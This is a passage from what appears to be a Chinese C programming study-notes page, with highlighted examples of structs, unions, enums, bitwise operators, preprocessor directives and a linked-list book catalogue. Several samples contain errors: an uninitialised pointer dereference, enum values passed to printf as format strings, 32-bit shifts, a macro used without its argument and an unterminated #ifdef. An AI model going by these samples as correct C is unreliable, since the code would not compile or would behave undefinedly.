class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">struct</span> <span class="token class-name">GamePlayerInfo</span> <span class="token operator">*</span> p<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token comment">//p->PlayName</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token comment">//(*p).PlayerName</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">.</span>PlayerName<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">union</span> Info MyInfo<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token function">strcpy</span><span class="token punctuation">(</span>MyInfo<span class="token punctuation">.</span>PlayName<span class="token punctuation">,</span><span class="token string">"NPC"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n%d\n%f\n"</span><span class="token punctuation">,</span>MyInfo<span class="token punctuation">.</span>PlayName<span class="token punctuation">,</span>MyInfo<span class="token punctuation">.</span>MP<span class="token punctuation">,</span>MyInfo<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token keyword">enum</span> <span class="token class-name">color</span> <span class="token punctuation">&#123;</span>red<span class="token punctuation">,</span>blue<span class="token punctuation">,</span>green<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 枚举</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">case</span> red<span class="token operator">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span>red<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">case</span> blue<span class="token operator">:</span></pre></td></tr><tr><td data-num="43"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span>blue<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token keyword">case</span> green<span class="token operator">:</span></pre></td></tr><tr><td data-num="46"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span>green<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token keyword">default</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="50"></td><td><pre>        <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="位运算"><a class="anchor" href="#位运算">#</a> 位运算</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token comment">//&amp; | ~ ^ &lt;&lt; >></span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">int</span> c <span class="token operator">=</span> a <span class="token operator">&amp;</span> b<span class="token punctuation">;</span><span class="token comment">// 与运算</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">int</span> d <span class="token operator">=</span> a <span class="token operator">|</span> b<span class="token punctuation">;</span><span class="token comment">// 或运算</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">int</span> aa <span class="token operator">=</span> <span class="token operator">~</span>b<span class="token punctuation">;</span><span class="token comment">// 非运算</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>aa<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">int</span> bb <span class="token operator">=</span> a <span class="token operator">^</span> b<span class="token punctuation">;</span><span class="token comment">// 异或</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>bb<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">int</span> a1 <span class="token operator">=</span> a <span class="token operator">&lt;&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">int</span> b1 <span class="token operator">=</span> a <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>b1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220111215542664.png" alt="image-20220111215542664" /></p>
<h2 id="c预处理器和c库"><a class="anchor" href="#c预处理器和c库">#</a> C 预处理器和 C 库</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">N</span> <span class="token expression"><span class="token number">5</span></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">NUM</span><span class="token expression"><span class="token punctuation">(</span>x<span class="token punctuation">)</span> x<span class="token operator">*</span>x</span></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">Num</span><span class="token expression"><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token function">printf</span><span class="token punctuation">(</span></span><span class="token string">"what is the number:%d"</span><span class="token expression"><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></span></span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">zero</span></span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SYS</span> <span class="token expression"><span class="token number">2</span></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">//#ifder #else #endif</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>N<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token function">NUM</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>NUM<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token function">Num</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">zero</span></span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this is def"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this is else"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">SYS <span class="token operator">==</span> <span class="token number">1</span></span></span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre> <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">elif</span> <span class="token expression">SYS <span class="token operator">==</span> <span class="token number">2</span></span></span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">//SYS == 1</span></span></pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token keyword">int</span> a11 <span class="token operator">=</span> <span class="token function">fabs</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 绝对值</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token keyword">int</span> b11 <span class="token operator">=</span> <span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 平方根</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="高级数据表示"><a class="anchor" href="#高级数据表示">#</a> 高级数据表示</h2>
<p>图书管理系统</p>
<ol>
<li>定义一个链表结构</li>
<li>实现链表的增删改查</li>
</ol>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">Node</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">char</span> Bookname<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">int</span> BookNumber<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">float</span> BookPrice<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token operator">*</span>next<span class="token punctuation">;</span><span class="token comment">// 指向下一个节点的指针</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span>Node<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>Node <span class="token operator">*</span> <span class="token function">AppendNode</span><span class="token punctuation">(</span>Node <span class="token operator">*</span> head<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>Bookname<span class="token punctuation">,</span> <span class="token keyword">int</span> BookNumer<span class="token punctuation">,</span><span class="token keyword">float</span> BookPrice<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    Node <span class="token operator">*</span> pNewNode <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    Node <span class="token operator">*</span> pHeadNode <span class="token operator">=</span> head<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    pNewNode <span class="token operator">=</span> <span class="token punctuation">(</span>Node <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>Node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>pNewNode <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"memory malloc failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        head <span class="token operator">=</span> pNewNode<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">while</span> <span class="token punctuation">(</span>pHeadNode<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>            pHeadNode <span class="token operator">=</span> pHeadNode<span class="token operator">-></span>next<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        pHeadNode<span class="token operator">-></span>next <span class="token operator">=</span> pNewNode<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token comment">// 书名</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token function">strcpy</span><span class="token punctuation">(</span>pNewNode<span class="token operator">-></span>Bookname<span class="token punctuation">,</span>Bookname<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token comment">// 定价</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    pNewNode<span class="token operator">-></span>BookPrice <span class="token operator">=</span> BookPrice<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token comment">// 书号</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    pNewNode<span class="token operator">-></span>BookNumber <span class="token operator">=</span> BookNumer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    pNewNode<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token keyword">return</span> head<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="44"></td><td><pre></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token keyword">void</span> <span class="token function">QueryNode</span><span class="token punctuation">(</span>Node <span class="token operator">*</span>head<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>Bookname<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"head == NULL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>Bookname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"书名：%s\n定价：%f\n书号：%d\n"</span><span class="token punctuation">,</span>head<span class="token operator">-></span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>BookPrice<span class="token punctuation">,</span>head<span class="token operator">-></span>BookNumber<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token keyword">while</span> <span class="token punctuation">(</span>head<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>        head <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>Bookname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="61"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"书名：%s\n定价：%f\n书号：%d\n"</span><span class="token punctuation">,</span>head<span class="token operator">-></span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>BookPrice<span class="token punctuation">,</span>head<span class="token operator">-></span>BookNumber<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>            flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="66"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="67"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="68"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Query failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="70"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="71"></td><td><pre></pre></td></tr><tr><td data-num="72"></td><td><pre><span class="token keyword">void</span> <span class="token function">ModeifyNode</span><span class="token punctuation">(</span>Node <span class="token operator">*</span>head<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>Bookname<span class="token punctuation">,</span><span class="token keyword">float</span> BookPrice<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="73"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="74"></td><td><pre>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="75"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="76"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="77"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"head == NULL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="78"></td><td><pre>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="79"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="80"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>Bookname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="81"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="82"></td><td><pre>        head<span class="token operator">-></span>BookPrice <span class="token operator">=</span> BookPrice<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="83"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"新定价：%f\n"</span><span class="token punctuation">,</span>head<span class="token operator">-></span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>BookPrice<span class="token punctuation">,</span>head<span class="token operator">-></span>BookNumber<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="84"></td><td><pre>        flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="85"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="86"></td><td><pre>    <span class="token keyword">while</span> <span class="token punctuation">(</span>head<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="87"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="88"></td><td><pre>        head <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="89"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>Bookname<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="90"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="91"></td><td><pre>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"新定价：%f\n"</span><span class="token punctuation">,</span>head<span class="token operator">-></span>Bookname<span class="token punctuation">,</span>head<span class="token operator">-></span>BookPrice<span class="token punctuation">,</span>head<span class="token operator">-></span>BookNumber<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="92"></td><td><pre>            flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="93"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="94"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="95"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="96"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="97"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Modify failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="98"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="99"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="100"></td><td><pre></pre></td></tr><tr><td data-num="101"></td><td><pre>Node <span class="token 